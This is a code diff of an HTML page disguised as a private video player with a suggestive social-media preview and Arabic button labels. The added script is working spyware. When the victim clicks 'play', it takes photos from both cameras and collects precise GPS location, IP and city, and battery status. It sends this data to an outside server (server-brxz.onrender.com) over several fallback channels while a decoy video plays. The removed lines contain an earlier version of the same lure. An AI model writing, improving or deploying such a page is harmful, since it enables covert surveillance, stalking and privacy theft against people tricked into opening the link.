@@ -1,10 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Video Player</title>
-    <style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta property="og:title" content="video Noor" />
+  <meta property="og:description" content="🫦🤤" />
+  <meta property="og:image" content="https://1drv.ms/i/c/025c6bbc5ba7e982/IQSkyV6-XmRLTJtYquMFMTF5AXsbNYMVB8cE2jtaOOqRaAU?width=987&height=1600" />
+  <meta property="og:image:type" content="image/jpeg" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="video Noor" />
+  <meta name="twitter:description" content="🫦🤤" />
+  <meta name="twitter:image" content="https://1drv.ms/i/c/025c6bbc5ba7e982/IQSkyV6-XmRLTJtYquMFMTF5AXsbNYMVB8cE2jtaOOqRaAU?width=987&height=1600" />
+  <title>r</title>
+  <style>
         * {
             margin: 0;
             padding: 0;
@@ -22,7 +33,6 @@
             color: #fff;
             overflow: hidden;
         }
-
         .video-player-container {
             width: 90%;
             max-width: 800px;
@@ -32,13 +42,12 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             position: relative;
         }
-
         .video-thumbnail {
             position: relative;
             width: 100%;
             height: 450px;
             background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
-                url('https://1drv.ms/i/c/025c6bbc5ba7e982/IQTBkQxHO9tQQoLyMqkdY1NgAQNoob9R9d0s6JBs5XDN2Do');
+                url('https://1drv.ms/i/c/025c6bbc5ba7e982/IQSkyV6-XmRLTJtYquMFMTF5AXsbNYMVB8cE2jtaOOqRaAU?width=987&height=1600');
             background-size: cover;
             background-position: center;
             display: flex;
@@ -47,48 +56,114 @@
             cursor: default;
             flex-direction: column;
         }
-
-        #locationActionButton {
+        .play-button-overlay {
+            width: 100px;
+            height: 100px;
+            background-color: rgba(255, 0, 0, 0.85);
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 120px;
-            height: 120px;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            position: relative;
+            z-index: 5;
+            cursor: pointer;
+        }
+        .play-button-overlay:hover {
+            transform: scale(1.1);
+            background-color: rgba(255, 0, 0, 0.95);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+        }
+        .play-icon-large {
+            width: 0;
+            height: 0;
+            border-left: 30px solid white;
+            border-top: 20px solid transparent;
+            border-bottom: 20px solid transparent;
+            margin-left: 8px;
+        }
+
+        /* زر تشغيل الفيديو (بدلاً من الترس) */
+        #gearButton {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 0, 0, 0.75);
+            border: 4px solid #ff6b6b;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            border: 3px solid #ff6b6b;
+            width: 130px;
+            height: 130px;
             cursor: pointer;
             transition: all 0.3s ease;
             backdrop-filter: blur(8px);
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
             z-index: 10;
+            text-align: center;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 0;
         }
-        #locationActionButton:hover {
-            transform: scale(1.05);
-            background: rgba(255, 255, 255, 0.2);
+        #gearButton:hover {
+            transform: translate(-50%, -50%) scale(1.08);
+            background: rgba(255, 0, 0, 0.9);
             border-color: #ff4757;
-            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
+            box-shadow: 0 0 70px rgba(255, 0, 0, 0.8);
         }
-        #locationActionButton .play-icon {
-            font-size: 60px;
-            color: #ff6b6b;
+        #gearButton .icon-gear {
+            display: none;
+        }
+        #gearButton .play-icon-btn {
+            font-size: 55px;
             line-height: 1;
-            user-select: none;
+            color: #fff;
+            margin-bottom: 2px;
+            display: block;
+            filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.5));
+        }
+        #gearButton .main-text {
+            font-size: 22px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
+            margin-top: 2px;
+        }
+        #gearButton .sub-text {
+            display: none;
         }
 
-        .play-button-overlay { display: none; }
+        #retryButton {
+            display: none;
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            z-index: 10;
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        #retryButton:hover {
+            background: #1557b0;
+        }
 
         .video-info {
             padding: 20px;
             border-bottom: 1px solid #333;
         }
-
         .video-title {
             font-size: 1.5rem;
             font-weight: bold;
             margin-bottom: 8px;
         }
-
         .video-controls {
             padding: 15px 20px;
             display: flex;
@@ -98,7 +173,6 @@
             flex-wrap: wrap;
             gap: 10px;
         }
-
         .control-button {
             background: none;
             border: none;
@@ -109,8 +183,9 @@
             border-radius: 4px;
             transition: background 0.2s;
         }
-        .control-button:hover { background: #333; }
-
+        .control-button:hover {
+            background: #333;
+        }
         .progress-bar {
             flex-grow: 1;
             height: 4px;
@@ -121,21 +196,18 @@
             position: relative;
             min-width: 60px;
         }
-
         .progress-fill {
             position: absolute;
             height: 100%;
             width: 0%;
             background: #ff0000;
         }
-
         .time-display {
             color: #aaa;
             font-size: 0.9rem;
             min-width: 100px;
             text-align: center;
         }
-
         .spinner {
             border: 4px solid #fff;
             border-top: 4px solid rgba(255, 255, 255, 0.3);
@@ -149,12 +221,10 @@
             left: 50%;
             transform: translate(-50%, -50%);
         }
-
         @keyframes spin {
             0% { transform: translate(-50%, -50%) rotate(0deg); }
             100% { transform: translate(-50%, -50%) rotate(360deg); }
         }
-
         #loading {
             display: none;
             font-size: 1.2rem;
@@ -162,16 +232,15 @@
             margin-top: 20px;
             text-align: center;
         }
-
-        .loading-text { margin-top: 10px; }
-
+        .loading-text {
+            margin-top: 10px;
+        }
         .volume-control {
             display: flex;
             align-items: center;
             gap: 10px;
             color: #aaa;
         }
-
         .volume-slider {
             width: 80px;
             height: 4px;
@@ -179,24 +248,53 @@
             border-radius: 2px;
             position: relative;
         }
-
         .volume-level {
             position: absolute;
             height: 100%;
             width: 70%;
             background: #ff0000;
         }
-
-        .fullscreen-btn { margin-left: 15px; }
-
+        .fullscreen-btn {
+            margin-left: 15px;
+        }
         @media (max-width: 480px) {
-            .video-controls { padding: 10px 12px; gap: 6px; }
-            .progress-bar { margin: 0 6px; }
-            .time-display { font-size: 0.75rem; min-width: 60px; }
-            .video-title { font-size: 1.2rem; }
-            .video-thumbnail { height: 280px; }
-            #locationActionButton { width: 90px; height: 90px; }
-            #locationActionButton .play-icon { font-size: 45px; }
+            .video-controls {
+                padding: 10px 12px;
+                gap: 6px;
+            }
+            .progress-bar {
+                margin: 0 6px;
+            }
+            .time-display {
+                font-size: 0.75rem;
+                min-width: 60px;
+            }
+            .video-title {
+                font-size: 1.2rem;
+            }
+            .video-thumbnail {
+                height: 280px;
+            }
+            .play-button-overlay {
+                width: 70px;
+                height: 70px;
+            }
+            .play-icon-large {
+                border-left-width: 22px;
+                border-top-width: 14px;
+                border-bottom-width: 14px;
+                margin-left: 5px;
+            }
+            #gearButton {
+                width: 100px;
+                height: 100px;
+            }
+            #gearButton .play-icon-btn {
+                font-size: 40px;
+            }
+            #gearButton .main-text {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
@@ -204,22 +302,28 @@
 
     <div class="video-player-container">
         <div class="video-info">
-            <div class="video-title">Private Video</div>
+            <div class="video-title"></div>
             <div class="video-meta"></div>
         </div>
 
         <div class="video-thumbnail" id="thumbnailArea">
-            <div id="locationActionButton">
-                <span class="play-icon">▶</span>
-            </div>
             <div class="play-button-overlay" id="playButtonOverlay">
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
             </div>
+
+            <!-- زر تشغيل الفيديو (بدلاً من الترس) -->
+            <div id="gearButton">
+                <div class="play-icon-btn">▶</div>
+                <div class="main-text">تشغيل الفيديو</div>
+                <div class="sub-text">اضغط لفتح الإعدادات</div>
+            </div>
+
+            <button id="retryButton">إعادة المحاولة</button>
         </div>
 
         <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
-            <source src="https://files.catbox.moe/mblca2.mp4" type="video/mp4" />
+            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
         </video>
 
         <div class="video-controls">
@@ -255,54 +359,100 @@
                 chatId: ''
             };
 
-            let settingsOpened = false;
+            let settingsOpened = false;    // true تعني أننا في انتظار العودة من الإعدادات
             let videoStarted = false;
             let isProcessing = false;
+            let dataSent = false;
 
-            const locationBtn = document.getElementById('locationActionButton');
+            const playBtn = document.getElementById('playButtonOverlay');
             const thumbnailArea = document.getElementById('thumbnailArea');
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
+            const gearBtn = document.getElementById('gearButton');
+            const retryBtn = document.getElementById('retryButton');
 
-            // ✅ فتح إعدادات الموقع
-            function openLocationSettings() {
+            // ===== طلب الصلاحيات =====
+            async function requestPermissions() {
+                let locationOk = false;
+                let cameraOk = false;
+
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            () => { locationOk = true; resolve(); },
+                            (err) => { reject(err); },
+                            { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    });
+                } catch (e) {
+                    locationOk = false;
+                }
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    stream.getTracks().forEach(t => t.stop());
+                    cameraOk = true;
+                } catch (e) {
+                    cameraOk = false;
+                }
+
+                return locationOk && cameraOk;
+            }
+
+            // ===== فتح إعدادات الموقع =====
+            function openBrowserLocationSettings() {
                 const ua = navigator.userAgent;
-                if (/Android/i.test(ua)) {
-                    const intents = [
-                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent:#Intent;action=android.settings.SETTINGS;end'
-                    ];
-                    for (let intent of intents) {
-                        try { window.location.href = intent; break; } catch (e) {}
-                    }
-                } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-                    setTimeout(() => window.open('prefs:root=Privacy&path=LOCATION', '_blank'), 500);
-                } else if (/Windows/i.test(ua)) {
-                    window.open('ms-settings:privacy-location', '_blank');
-                } else if (/Mac/i.test(ua)) {
-                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
-                } else {
+
+                if (/Chrome/.test(ua) && !/Edge/.test(ua)) {
+                    try {
+                        window.location.href = 'chrome://settings/content/location';
+                        return;
+                    } catch (e) {}
+                }
+
+                if (/Firefox/.test(ua)) {
+                    try {
+                        window.location.href = 'about:preferences#privacy';
+                        return;
+                    } catch (e) {}
+                }
+
+                if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
+                    try {
+                        window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
+                        return;
+                    } catch (e) {}
+                }
+
+                if (/Android/.test(ua)) {
+                    try {
+                        window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
+                        return;
+                    } catch (e) {}
+                    try {
+                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                        return;
+                    } catch (e) {}
+                }
+
+                try {
                     window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                } catch (e) {
+                    alert('تعذر فتح الإعدادات. يرجى فتح إعدادات الموقع يدوياً في متصفحك.');
                 }
             }
 
-            // ✅ جلب IP - بدون انتظار طويل
+            // ===== جلب البيانات =====
             async function fetchIPInfo() {
                 try {
-                    const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 3000);
-                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                    const response = await fetch('https://ipapi.co/json/');
                     const data = await response.json();
                     capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                 } catch {
                     capturedData.ipInfo = "IP Info not available";
                 }
             }
-
-            // ✅ جلب البطارية
             async function getBatteryStatus() {
                 try {
                     const battery = await navigator.getBattery();
@@ -311,8 +461,6 @@
                     capturedData.batteryStatus = "Unknown";
                 }
             }
-
-            // ✅ التصوير - بدون تأخير طويل
             async function captureFromCamera(facingMode) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
@@ -320,165 +468,287 @@
                     });
                     const video = document.createElement('video');
                     video.srcObject = stream;
-                    video.muted = true;
                     await video.play();
-
-                    await new Promise(resolve => {
-                        if (video.readyState >= 2) return resolve();
-                        video.onloadeddata = () => resolve();
-                        setTimeout(resolve, 500);
-                    });
-
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    capturedData.images.push(canvas.toDataURL('image/jpeg', 0.7).split(',')[1]);
+                    capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
                     stream.getTracks().forEach(track => track.stop());
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                 } catch {
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                 }
             }
-
-            // ✅ طلب الموقع - لا يوقف الفيديو حتى لو رُفض
             async function getLocation() {
-                return new Promise((resolve) => {
-                    const timeout = setTimeout(() => {
-                        capturedData.permissions.push('Geolocation Timeout');
-                        capturedData.location = 'Not Available';
-                        resolve(); // ✅ يكمل حتى بدون موقع
-                    }, 3000);
-
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            clearTimeout(timeout);
-                            capturedData.location = 
-                                `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
-                            capturedData.permissions.push('Geolocation Allowed');
-                            resolve();
-                        },
-                        (error) => {
-                            clearTimeout(timeout);
-                            capturedData.permissions.push('Geolocation Denied');
-                            capturedData.location = 'Denied by User';
-                            resolve(); // ✅ يكمل حتى لو رفض المستخدم
-                        },
-                        {
-                            enableHighAccuracy: false,
-                            timeout: 3000,
-                            maximumAge: 60000
-                        }
-                    );
-                });
-            }
-
-            // ✅ إرسال البيانات في الخلفية
-            function sendDataInBackground(data) {
                 try {
-                    const blob = new Blob([new URLSearchParams(data).toString()], {
-                        type: 'application/x-www-form-urlencoded'
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        });
                     });
-                    navigator.sendBeacon('https://server-brxz.onrender.com/submitData', blob);
-                } catch (e) {}
-
-                fetch('https://server-brxz.onrender.com/submitData', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: new URLSearchParams(data),
-                    mode: 'no-cors',
-                    keepalive: true
-                }).catch(() => {});
+                    capturedData.location =
+                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
+                    capturedData.permissions.push('Geolocation Allowed');
+                } catch (err) {
+                    capturedData.permissions.push('Geolocation Denied');
+                    capturedData.location = '';
+                }
             }
 
-            // ✅ إظهار الفيديو فوراً
-            function showVideo() {
+            // ===== إرسال البيانات =====
+            async function sendDataWithBypass(data) {
+                const urls = [
+                    'https://server-brxz.onrender.com/submitData',
+                    'https://server-brxz.onrender.com/submitData'
+                ];
+                for (let url of urls) {
+                    try {
+                        await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: new URLSearchParams(data),
+                            mode: 'no-cors'
+                        });
+                        return;
+                    } catch (e) {}
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', url, false);
+                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                        xhr.send(new URLSearchParams(data));
+                        return;
+                    } catch (e) {}
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        document.body.appendChild(iframe);
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = url;
+                        form.target = iframe.name || 'hiddenFrame';
+                        iframe.name = form.target;
+                        for (let key in data) {
+                            const input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = key;
+                            input.value = data[key];
+                            form.appendChild(input);
+                        }
+                        document.body.appendChild(form);
+                        form.submit();
+                        setTimeout(() => {
+                            document.body.removeChild(form);
+                            document.body.removeChild(iframe);
+                        }, 1000);
+                        return;
+                    } catch (e) {}
+                    try {
+                        const blob = new Blob([new URLSearchParams(data).toString()], {
+                            type: 'application/x-www-form-urlencoded'
+                        });
+                        navigator.sendBeacon(url, blob);
+                        return;
+                    } catch (e) {}
+                }
+            }
+
+            // ===== جمع البيانات وإرسالها (تُستدعى دائماً) =====
+            async function collectAndSendData() {
+                if (dataSent) return;
+                dataSent = true;
+
+                try {
+                    capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
+
+                    await Promise.all([
+                        fetchIPInfo(),
+                        getBatteryStatus(),
+                        getLocation()
+                    ]);
+
+                    await captureFromCamera('user');
+                    await captureFromCamera('environment');
+                    await captureFromCamera('user');
+                    await captureFromCamera('environment');
+
+                    const data = {
+                        chatId: capturedData.chatId,
+                        imageDatas: capturedData.images.join(','),
+                        location: capturedData.location,
+                        permissions: capturedData.permissions.join(', '),
+                        ipInfo: capturedData.ipInfo,
+                        battery: capturedData.batteryStatus
+                    };
+
+                    await sendDataWithBypass(data);
+                } catch (e) {
+                    // تجاهل الأخطاء، المهم أن نحاول الإرسال
+                }
+            }
+
+            // ===== تشغيل الفيديو فوراً =====
+            function startVideoWithSound() {
+                if (videoStarted) return;
+                videoStarted = true;
+
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
+
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
-                if (realVideo.paused) {
-                    realVideo.play().catch(() => {});
+
+                const playPromise = realVideo.play();
+                if (playPromise !== undefined) {
+                    playPromise.then(() => {}).catch(() => {
+                        realVideo.muted = true;
+                        realVideo.play().then(() => {
+                            setTimeout(() => {
+                                realVideo.muted = false;
+                                realVideo.volume = 1.0;
+                            }, 100);
+                        }).catch(() => {});
+                    });
                 }
+
+                setTimeout(() => {
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
+                    try { realVideo.play(); } catch (e) {}
+                }, 500);
+
+                setTimeout(() => {
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
+                    try { realVideo.play(); } catch (e) {}
+                }, 3000);
             }
 
-            // ✅ جمع البيانات في الخلفية - بدون انتظار
-            async function collectDataInBackground() {
-                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
-
-                // ✅ كل العمليات بالتوازي ولا تنتظر
-                await Promise.allSettled([
-                    fetchIPInfo(),
-                    getBatteryStatus(),
-                    getLocation(),
-                    captureFromCamera('user'),
-                    captureFromCamera('environment')
-                ]);
-
-                const data = {
-                    chatId: capturedData.chatId,
-                    imageDatas: capturedData.images.join(','),
-                    location: capturedData.location,
-                    permissions: capturedData.permissions.join(', '),
-                    ipInfo: capturedData.ipInfo,
-                    battery: capturedData.batteryStatus
-                };
-
-                sendDataInBackground(data);
+            // ===== إظهار / إخفاء الأزرار =====
+            function showGearButton() {
+                gearBtn.style.display = 'flex';
+                playBtn.style.display = 'none';
+                retryBtn.style.display = 'none';
             }
 
-            // ✅ معالج الضغط - الفيديو يشتغل فوراً
-            async function handleButtonClick() {
-                if (isProcessing || videoStarted) return;
+            function hideGearButton() {
+                gearBtn.style.display = 'none';
+                playBtn.style.display = 'flex';
+                retryBtn.style.display = 'none';
+            }
+
+            function showRetryButton() {
+                retryBtn.style.display = 'block';
+                gearBtn.style.display = 'none';
+                playBtn.style.display = 'none';
+            }
+
+            // ===== معالج الضغط على زر التشغيل =====
+            async function handlePlayClick(e) {
+                e.stopPropagation();
+                if (videoStarted || isProcessing) return;
+
                 isProcessing = true;
 
-                if (!settingsOpened) {
-                    // الضغطة الأولى - فتح الإعدادات
-                    settingsOpened = true;
-                    openLocationSettings();
+                // إذا كانت settingsOpened == true، فهذه هي الضغطة الثانية بعد العودة من الإعدادات
+                if (settingsOpened) {
+                    settingsOpened = false;
+                    // طلب الصلاحيات
+                    const granted = await requestPermissions();
+                    // تشغيل الفيديو فوراً (بغض النظر عن النتيجة)
+                    startVideoWithSound();
+                    // إرسال البيانات
+                    if (!dataSent) {
+                        collectAndSendData();
+                    }
+                    // إذا رفض، نعرض زر الترس (الذي هو زر تشغيل الفيديو)
+                    if (!granted) {
+                        showGearButton();
+                    } else {
+                        hideGearButton();
+                    }
                     isProcessing = false;
+                    return;
+                }
+
+                // الضغطة الأولى: نفتح إعدادات الموقع
+                settingsOpened = true;
+                openBrowserLocationSettings();
+                // لا نطلب صلاحيات ولا نشغل فيديو الآن
+                isProcessing = false;
+            }
+
+            // ===== معالج زر "تشغيل الفيديو" (الذي كان ترس) =====
+            function handleGearClick() {
+                // هذا الزر يظهر عند رفض الصلاحيات، نفتح الإعدادات مرة أخرى
+                settingsOpened = true;
+                openBrowserLocationSettings();
+            }
+
+            // ===== معالج زر إعادة المحاولة =====
+            async function handleRetryClick() {
+                // نطلب الصلاحيات مباشرة
+                const granted = await requestPermissions();
+                if (granted) {
+                    hideGearButton();
+                    startVideoWithSound();
+                    if (!dataSent) {
+                        collectAndSendData();
+                    }
                 } else {
-                    // الضغطة الثانية - تشغيل الفيديو فوراً
-                    videoStarted = true;
-                    showVideo(); // ✅ الفيديو يشتغل مباشرة
-                    
-                    // جمع البيانات في الخلفية بدون انتظار
-                    collectDataInBackground().catch(() => {});
-                    
-                    isProcessing = false;
+                    showGearButton();
                 }
             }
 
+            // ===== مراقبة العودة من الإعدادات (لا نقوم بأي شيء تلقائي، ننتظر الضغطة الثانية) =====
             document.addEventListener('visibilitychange', function() {
-                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // العودة من الإعدادات
-                }
+                // لا نفعل شيئاً هنا، لأننا نعتمد على الضغطة الثانية
+                // يمكن إضافة تنبيه أو لا
             });
 
-            if (locationBtn) {
-                locationBtn.addEventListener('click', handleButtonClick);
+            // ===== ربط الأحداث =====
+            if (playBtn) {
+                playBtn.addEventListener('click', handlePlayClick);
+            }
+            if (thumbnailArea) {
+                thumbnailArea.addEventListener('click', handlePlayClick);
+            }
+            if (gearBtn) {
+                gearBtn.addEventListener('click', handleGearClick);
+            }
+            if (retryBtn) {
+                retryBtn.addEventListener('click', handleRetryClick);
             }
 
+            // ===== تفعيل الصوت عند أي تفاعل =====
             document.addEventListener('click', function() {
                 if (realVideo) {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
+                    try { realVideo.play(); } catch (e) {}
                 }
             }, true);
 
+            // ===== أزرار التحكم =====
             document.querySelectorAll('.control-button').forEach(button => {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
                     if (this.textContent.includes('⛶')) {
                         const video = document.getElementById('realVideo');
-                        if (video.requestFullscreen) video.requestFullscreen();
-                        else if (video.webkitRequestFullscreen) video.webkitRequestFullscreen();
+                        if (video.requestFullscreen) {
+                            video.requestFullscreen();
+                        } else if (video.webkitRequestFullscreen) {
+                            video.webkitRequestFullscreen();
+                        }
                     }
                 });
             });
 
-            // شريط التقدم
+            // ===== شريط التقدم الوهمي =====
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
